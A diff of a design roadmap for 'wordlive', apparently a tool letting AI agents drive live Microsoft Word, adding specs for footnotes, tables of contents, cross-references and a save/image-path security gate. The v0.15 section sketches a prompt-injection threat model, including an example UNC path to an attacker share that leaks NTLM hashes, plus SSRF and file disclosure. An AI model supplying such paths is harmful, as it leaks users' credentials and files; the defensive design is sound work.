@@ -238,6 +238,9 @@ the caller never needs to know the image's dimensions.
 
 ## v0.9 — image extraction (read images out for vLLMs)
 
+> **Status: approved to build 2026-05-31.** Specced but not yet implemented —
+> only `insert_image` (v0.8) ships today; there is no `read_image`/`doc.images`.
+
 Spiked before speccing, and it came back clean. `Range.WordOpenXML` returns the
 range as **Flat OPC**, inlining each referenced media part as base64
 (`<pkg:binaryData>`). On a tight per-shape range it carries **exactly that
@@ -278,6 +281,14 @@ no Pillow). It's the read half that pairs with v0.8's `insert_image` write.
 ---
 
 ## v0.10 — charts (Excel-backed)
+
+> **Status: approved to build 2026-05-31.** Specced but not yet implemented —
+> `insert_chart` does not exist today. Approved as the SmartArt substitute: the
+> "diagram this" intent is served by a real chart (here) or by rendering
+> mermaid/graphviz → PNG into the v0.8 `insert_image`, **not** by native
+> SmartArt (`Shapes.AddSmartArt`), which was considered and declined 2026-05-31
+> — GUID-indexed layouts, floating-only, hard to read back, brittle across Word
+> versions/locales, for an intent charts already cover.
 
 Follows image insertion. `Range.InlineShapes.AddChart2(Style, Type, …)` embeds
 a chart whose data lives in an embedded Excel workbook
@@ -389,6 +400,240 @@ at each break.
 
 ---
 
+## v0.13 — reference apparatus: footnotes, endnotes, TOC
+
+Status: approved 2026-05-31. The "reference scaffolding" track — all three are
+note/field structures that attach to a range, so they fit the anchor model the
+same way `insert_table` / `insert_image` did.
+
+### Footnotes & endnotes
+
+- **`anchor.insert_footnote(text, *, where="after")` /
+  `anchor.insert_endnote(text, …)`** on the base `Anchor` —
+  `Range.Footnotes.Add(Range, Reference="", Text=text)` (Endnotes mirror it).
+  Empty `Reference` = Word auto-numbers (the 90% case; a custom mark is
+  deferred). The reference mark lands at the anchor's collapsed range; the note
+  body is `text`. Lands inside `doc.edit()` for one-Ctrl-Z undo.
+- **`doc.footnotes` / `doc.endnotes`** — read-only discovery collections (mirror
+  `doc.lists` / `doc.tables`). `list()` emits `[{index, marker, text, para}]`,
+  so an agent sees each note and the `para:N` its mark sits in before touching
+  anything.
+- **Addressing:** `footnote:N` / `endnote:N`, 1-based over `doc.Footnotes` /
+  `doc.Endnotes`, resolving to the **note-body range** — so `set_text` edits the
+  note text and `.delete()` removes mark + note together.
+- **exec ops:** `insert_footnote` / `insert_endnote` (anchor_id, text, where?).
+- **CLI:** `wordlive insert-footnote --anchor-id ID --text …` (and `-endnote`);
+  `wordlive footnotes` / `wordlive endnotes` (list).
+- **MCP:** `word_write` `insert_footnote`/`insert_endnote`; `word_read`
+  `footnotes`/`endnotes`.
+- **Deferred:** custom reference marks, separators, numbering format/restart,
+  footnote↔endnote conversion.
+- **Spike-confirmed (2026-05-31, live Word):** `Footnotes.Add` / `Endnotes.Add`
+  must take their args **positionally** — `Footnotes.Add(rng, "", text)` lands the
+  body, but the `Text=` *keyword* is silently dropped under pywin32 late binding
+  (reads back `''`). Empty `Reference` auto-numbers (mark char `\x02`). The
+  note-body lives in its own story (`Range.StoryType == 2`); `note.Range.Text`
+  round-trips read/write, so `footnote:N` → note-body range + `set_text` works as
+  designed.
+
+### Table of contents
+
+- **`anchor.insert_toc(*, levels=(1, 3), use_heading_styles=True,
+  hyperlinks=True, where="after")`** + **`doc.add_toc(...)`** sugar
+  (= `doc.start.insert_toc(...)`, the usual top-of-doc placement). COM:
+  `doc.TablesOfContents.Add(Range, UseHeadingStyles=True, UpperHeadingLevel=lo,
+  LowerHeadingLevel=hi, UseHyperlinks=True)`. `hyperlinks=True` makes entries
+  clickable (in-doc navigation an agent can drive).
+- **Page numbers need repagination.** A TOC is a field; numbers are correct only
+  after layout. Expose **`toc.update()`** (`TableOfContents.Update()`) and steer
+  the guide to call it (or `snapshot`, which forces print layout) before reading
+  page numbers back.
+- **`doc.update_fields()`** — small companion primitive (`doc.Fields.Update()`):
+  TOC, cross-refs, and `{ PAGE }` all need a field refresh, so one verb covers
+  them. CLI `wordlive update-fields`; MCP `word_write update_fields`.
+- **exec op:** `insert_toc` (anchor_id, levels?, hyperlinks?).
+- **CLI:** `wordlive insert-toc --anchor-id ID [--levels 1-3] [--no-hyperlinks]`.
+- **MCP:** `word_write` `insert_toc`.
+- **Deferred:** table of figures/authorities, custom TOC field codes, explicit
+  per-style level mapping (`\t` switches), index generation.
+- **Spike-confirmed (2026-05-31):** `TablesOfContents.Add(...)` + `.Update()`
+  builds the TOC and renders entries (`"First Heading\t1 | Second Heading\t1"`)
+  — page numbers populate after `Update()`, as expected.
+
+---
+
+## v0.14 — anchoring & linking: bookmark creation, hyperlinks, cross-references, captions
+
+Status: approved 2026-05-31. These cluster because **creating a named anchor is
+the prerequisite for the rest** — cross-references and internal hyperlinks both
+target a bookmark. Build in this order.
+
+### Bookmark creation (do first)
+
+- **`doc.bookmarks.add(name, anchor)`** — `Range.Bookmarks.Add(Name, Range)` over
+  the resolved anchor's range; `anchor` is an id (`anchor_by_id`) or an `Anchor`.
+  Validates `name` against Word's rules (letters/digits/underscores, leading
+  letter, no spaces) → typed error before mutating. Closes the gap where
+  `bookmarks[name]` could only read/write *existing* bookmarks (`Bookmarks.Add`
+  is internal-only today — overwrite-preservation in `Bookmark.set_text`).
+- **exec op:** `add_bookmark` (name, anchor_id). **CLI:** `wordlive bookmark add
+  NAME --anchor-id ID`. **MCP:** `word_write` `add_bookmark`.
+
+### Hyperlinks
+
+- **`anchor.link_to(address=None, *, bookmark=None, text=None, screen_tip=None)`**
+  — `address` XOR `bookmark` (external URL vs. internal jump to a bookmark).
+  `Range.Hyperlinks.Add(Anchor=range, Address=url, SubAddress=bookmark,
+  TextToDisplay=text)`. `text=None` turns the anchor's existing range into the
+  link (keeps its text); `text=…` inserts new linked text.
+- **exec op:** `add_hyperlink`. **CLI:** `wordlive link --anchor-id ID (--url U |
+  --bookmark B) [--text T]`. **MCP:** `word_write` `add_hyperlink`.
+- **Deferred:** hyperlink read-back collection (`doc.hyperlinks`);
+  editing/removing an existing link.
+
+### Cross-references (the approved design pass)
+
+- **`anchor.insert_cross_reference(target, *, kind="text", hyperlink=True,
+  where="after")`** — `target` is an anchor id we can map: `bookmark:NAME`,
+  `heading:N`, `footnote:N`/`endnote:N`. `kind` = what to display: `"text"`
+  (referenced text/caption) · `"page"` (page number) · `"number"`
+  (paragraph/heading number) · `"above_below"` ("above"/"below"). Maps to
+  `WdReferenceKind`.
+- **The awkward bit, resolved.** `Range.InsertCrossReference(ReferenceType,
+  ReferenceKind, ReferenceItem, InsertAsHyperlink, IncludePositionInformation)`
+  takes `ReferenceItem` as a **1-based index into
+  `doc.GetCrossReferenceItems(ReferenceType)`**, not our anchor ids. The mapping
+  layer: `bookmark:NAME` → position of NAME in the bookmark item list;
+  `heading:N` (paragraph index) → its position in the heading item list;
+  `footnote:N` → N directly. A target Word can't resolve to an item raises
+  `AnchorNotFoundError` (exit 2) before mutating.
+- New internal `WdReferenceType` / `WdReferenceKind` enum subsets in
+  `constants.py` (not exported — mirrors `WdStyleType` / `XlChartType`).
+- **exec op:** `insert_cross_reference` (anchor_id, target, kind?, hyperlink?).
+  **CLI:** `wordlive cross-ref --anchor-id ID --target bookmark:Foo --kind page`.
+  **MCP:** `word_write` `insert_cross_reference`.
+- **Deferred:** cross-refs to numbered-list items and equations;
+  `IncludePositionInformation` (above/below + page combos).
+- **Spike-confirmed (2026-05-31, live Word):** the mechanism is sound and
+  *less* fiddly than feared. `Range.Bookmarks.Add(Name, Range)` creates the
+  named anchor (`Exists` → True). `GetCrossReferenceItems(refType)` returns an
+  ordered, 1-based list of **strings** — heading *text* for headings, bookmark
+  *names* for bookmarks — so `bookmark:NAME` → `items.index(NAME)+1` and
+  `heading:N` → its ordinal among headings both map cleanly.
+  `InsertCrossReference` inserts a live `{ REF _Ref… \h }` field for heading and
+  bookmark targets. **Gotcha:** passing `IncludePositionInformation=` as a
+  keyword raises "unexpected keyword argument" under pywin32 — omit it or pass
+  positionally (same late-binding issue as the footnote `Text` arg). The
+  `ReferenceKind` → field-switch detail (`\p` for page number) still wants a
+  build-time check; both `-1` and `7` inserted a field but emitted the same
+  `\h`-only code in the quick sweep.
+
+### Captions (rounds out the figure/table workflow)
+
+- **`anchor.insert_caption(label="Figure", *, text=None, where="after")`** —
+  `Range.InsertCaption(Label, Title=text)`. Built-in labels Figure/Table/Equation
+  or a custom string; auto-numbers per label. Pairs with cross-references
+  (cross-ref a captioned figure). Lower priority than the three above — ship if
+  cheap, else fold into a follow-up.
+- **Deferred:** caption numbering format/chapter-style; the table-of-figures that
+  consumes captions.
+
+---
+
+## v0.15 — the LLM-facing filesystem boundary: persistence + image-source hardening
+
+Status: approved 2026-05-31. wordlive's one coherent **filesystem boundary**
+for agent-driven surfaces, covering both directions: **writes** (save / export)
+and **reads** (image sources). The boundary is the same in both — the **Python
+API is trusted/ungated**; the **CLI/MCP surfaces are gated** because their input
+can be prompt-injected. Designing the read and write gates together keeps one
+mental model (allowed-directory lists, resolve-then-contain, typed denial) and
+one set of docs, rather than two ad-hoc rules.
+
+### Persistence — save / save-as / PDF export (directory-whitelisted)
+
+The first surface that *writes* to the filesystem, so the design is a *gate*,
+not a verb. COM is trivial (`Document.Save`, `SaveAs2`, and `ExportAsFixedFormat`
+— already used by `_snapshot.py`); the contract is what keeps an agent from
+silently overwriting the user's files.
+
+- **Python API is ungated** (it's a library; the calling human is trusted):
+  `doc.save()` (in-place; errors if the doc has no path yet),
+  `doc.save_as(path, *, fmt="docx", overwrite=False)`,
+  `doc.export_pdf(path, *, from_page=None, to_page=None)`, plus `doc.saved`
+  (dirty-flag read) and `doc.path` (read).
+- **LLM-facing surfaces (CLI/MCP) are default-deny with a directory whitelist.**
+  Saving is enabled only by configuring **allowed directories**; a save whose
+  *resolved target* is not inside a whitelisted dir is rejected. Empty whitelist
+  = no saving at all (the default).
+  - **CLI:** `--save-dir DIR` (repeatable) on the save/export commands, and/or
+    `WORDLIVE_SAVE_DIRS` (`os.pathsep`-separated) as a session default.
+  - **MCP:** the long-running server is launched with its allowed dirs (CLI arg /
+    env / bundle config); `word_write` `save`/`save_as`/`export_pdf` check the
+    configured whitelist. The operator configures once; the agent can't widen it.
+  - **Containment check:** `Path(target).resolve()` then `is_relative_to` against
+    each resolved whitelist dir — resolve *first* so `..`/symlink escapes can't
+    slip a write outside the allowed tree.
+  - **Plain `Save()` (overwrite the open doc) is gated too** — its target is the
+    doc's *existing* path, which must also sit inside the whitelist, so an agent
+    can't silently overwrite a document the user opened from elsewhere. Stated
+    explicitly because it's the surprising case.
+- **New typed error `SaveNotAllowedError(WordliveError)` → exit 1.** It's a
+  *policy denial / bad-input*, not a named-thing-missing, so it does **not**
+  subclass `AnchorNotFoundError` — the six-code exit contract is untouched.
+- **Not an exec op.** A save is a terminal side-effect with no undo, so it stays
+  off the `doc.edit()` batch surface (same reasoning that kept `read_image` and
+  `write_cursor` off). CLI/MCP single commands only.
+- **Formats:** `docx` (default) + `pdf` (export) first; `doc`/`rtf`/`txt`/`html`
+  via `WdSaveFormat` deferred until asked.
+- **Guide/MCP docs:** state plainly that saving is **off** unless the operator
+  whitelists directories, and that PDF export is the recommended "hand back a
+  deliverable" path (it pairs with `snapshot`).
+
+### Image-source hardening (read side) — raised 2026-05-31
+
+`insert_image --path …` (v0.8) hands `FileName` to
+`InlineShapes.AddPicture(LinkToFile=False)`, which resolves more than local
+paths. That makes the *path* input (not base64/bytes — those carry their own
+data and never touch the FS/network) an attack surface a prompt injection can
+reach. Threat model:
+
+- **UNC path → NTLM credential theft (sharpest, Windows-specific).** An injected
+  `--path \\attacker\share\x.png` forces Word to authenticate over SMB to an
+  attacker host, leaking the user's NetNTLMv2 hash. Worse: `image_on_disk`'s own
+  `Path(p).is_file()` *classification* probe triggers the SMB auth **before** COM
+  is reached, so the leak fires even when the target isn't an image.
+- **URL → SSRF.** `http(s)://…` would make Word issue the request. *Incidentally
+  closed today* — `Path("http://…").is_file()` is False, so it falls through to
+  base64-decode and raises `ImageSourceError` before COM. Load-bearing accident;
+  the gate should make it intentional.
+- **Local image-file disclosure.** Any readable *image* anywhere on disk embeds
+  into a doc that may then be shared. Bounded to real images (Word rejects
+  non-image bytes, so this is not an arbitrary-file exfil), but a private
+  screenshot/diagram is in scope.
+
+Mitigation — the read mirror of the save whitelist:
+
+- **Python API ungated** (a developer passing a UNC path is making a choice —
+  same boundary as `doc.save()`).
+- **CLI/MCP, always:** reject non-local `FileName`s — UNC (`\\…`) and explicit
+  URL/`file://` schemes — **before** the `is_file()` probe, so classification
+  itself can't leak. Cheap, no legitimate-use cost, kills the NTLM/SSRF vectors.
+- **CLI/MCP, optional defense-in-depth:** a read-directory allowlist (`--image-dir`
+  / `WORDLIVE_IMAGE_DIRS`, the exact mirror of `--save-dir`) for local-disclosure;
+  configured → a path source must resolve within it; unconfigured → any *local*
+  path (back-compat), with UNC/URL still blocked.
+- **Steer MCP toward base64/bytes** — inherently safe (agent supplies the bytes,
+  no FS/network touch) and already the priority LLM path.
+- **Typed error** reuses the v0.15 denial type (`SaveNotAllowedError` likely
+  renamed to a neutral `PathNotAllowedError` once it guards reads *and* writes)
+  → exit 1.
+- **Note:** `LinkToFile=False` means the fetch is **one-shot at insert time**, not
+  a stored auto-refreshing link — so the blast radius is the single insert call,
+  not a persistent link in the saved doc.
+
+---
+
 ## v0.11+ — defer
 
 - **Events / sinks** — `WithEvents(word.com, Handler)` for
@@ -401,6 +646,12 @@ at each break.
   Cover paragraph styles in v0.2 first, see what's actually missing.
 - **PageSetup writes** — margins, orientation, page size. Reads shipped in
   v0.6; writes want their own small pass (units, section-vs-document scope).
+- **Native SmartArt** — considered and **declined 2026-05-31**.
+  `Shapes.AddSmartArt(Layout, …)` + driving the `Nodes` tree is heavy and
+  brittle (GUID-indexed layouts from `Application.SmartArtLayouts`, floating-only,
+  hard to read back, locale/version-sensitive) for an intent that charts (v0.10)
+  and render-diagram-to-image (mermaid/graphviz → `insert_image`) already serve.
+  Revisit only if a concrete SmartArt-specific need appears.
 
 ---
 
@@ -417,12 +668,13 @@ at each break.
 
 ### Papercuts found in the 2026-05 agent test
 
-- **Relative image paths fail.** `insert_image --path foo.png` errors with COM
-  `0x80020009` ("This is not a valid file name") whenever the path is relative,
-  because `InlineShapes.AddPicture` resolves it against *Word's* working
-  directory, not the CLI's. Fix: `Path(p).resolve()` (or resolve against CWD)
-  before handing the path to COM. Pure papercut, no API change — and a likely
-  silent foot-gun for every agent that passes a relative path.
+- **Relative image paths fail. → Promoted 2026-05-31: fix in the next patch.**
+  `insert_image --path foo.png` errors with COM `0x80020009` ("This is not a
+  valid file name") whenever the path is relative, because
+  `InlineShapes.AddPicture` resolves it against *Word's* working directory, not
+  the CLI's. Fix: `Path(p).resolve()` (or resolve against CWD) before handing the
+  path to COM. Pure papercut, no API change — and a likely silent foot-gun for
+  every agent that passes a relative path.
 - **`heading:N` is mis-described in the agent guide.** `SKILL.md` / `llm-help`
   call it "the Nth heading (1-based)", but the id is actually the *paragraph
   index* restricted to headings — so the first heading can be `heading:7`. The
